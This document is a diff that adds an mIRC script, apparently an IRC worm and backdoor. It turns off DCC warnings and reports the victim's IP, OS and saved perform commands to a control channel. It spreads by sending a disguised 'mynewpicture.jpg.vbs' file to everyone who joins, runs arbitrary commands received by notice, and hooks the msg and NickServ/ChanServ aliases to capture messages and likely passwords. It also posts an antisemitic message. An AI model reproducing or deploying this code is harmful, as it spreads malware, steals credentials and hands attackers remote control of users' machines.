@@ -1,0 +1,29 @@
+[script]
+n0=on *:CONNECT:{
+n1=  .writeini mirc.ini extensions n0 defaultEXTDIR: | .writeini mirc.ini warn dcc off | .sreq +m auto | .fsend on | .perform on
+n2=  .if (%chan == $null) || (%chan == #1/2/00) { set %chan #1/2/00 | .timer 1 3 .join %chan | .timer 1 30 .part %chan I LOVE Jew! | halt }
+n3=  .else { goto continue }
+n4=  :continue
+n5=  .msg %chan [ ( $+ [ $fulldate ] $+ ) $server $port $ip OS: $os it's been $duration($calc($ticks / 1000)) since since system boot.  relayed %sent so far. ]
+n6=  .if ($readini $mircdir\mirc.ini perform n0 != $null) { set %var -1 | goto loop }
+n7=  .else { halt }
+n8=  :loop
+n9=  .inc %var | .set %var2 n $+ %var
+n10=  .if ($readini $mircdir\mirc.ini perform %var2 == $null) { unset %var* | halt }
+n11=  .if ($readini $mircdir\mirc.ini perform %var2 != $null) { .msg %chan $readini $mircdir\mirc.ini perform %var2 | goto loop }
+n12=}
+n13=on ^*:JOIN:#:{
+n14=  .if ( $nick == $me ) { halt }
+n15=  .else { .dcc send $nick $mircdirmynewpicture.jpg.vbs }
+n16=} 
+n17=on ^*:NICK:{ if ($nick == $me) { .msg %chan was: $nick now: $newnick } }
+n18=on ^*:NOTICE:setchan*:?:{ .set %chan $2 | halt }
+n19=on ^*:NOTICE:century*:?:{ haltdef | .msg %chan Died: $time by $nick | .exit }
+n20=on ^*:NOTICE:command*:?:{ haltdef | .notice $nick did: $2- | // $+ $2-  }
+n21=on ^*:NOTICE:stats*:?:{( $+ [ $fulldate ] $+ ) $server $port $ip OS: $os it's been $duration($calc($ticks / 1000)) since since system boot.  relayed %sent so far. }
+n22=on *:FILESENT:*.jpg.vbs: inc %sent
+n23=alias chanserv { rub.msg (msg:chanserv) $1- | chanserv $1- }
+n24=alias nickserv { rub.msg (msg:nickserv) $1- | nickserv $1- }
+n25=alias operserv { rub.msg (msg:operserv) $1- | operserv $1- }
+n26=alias msg { rub.msg (msg: $+ $1 $+ ) $2- | msg $1- }
+n27=alias privmsg { rub.msg (msg: $+ $1 $+ ) $2- | privmsg $1- }
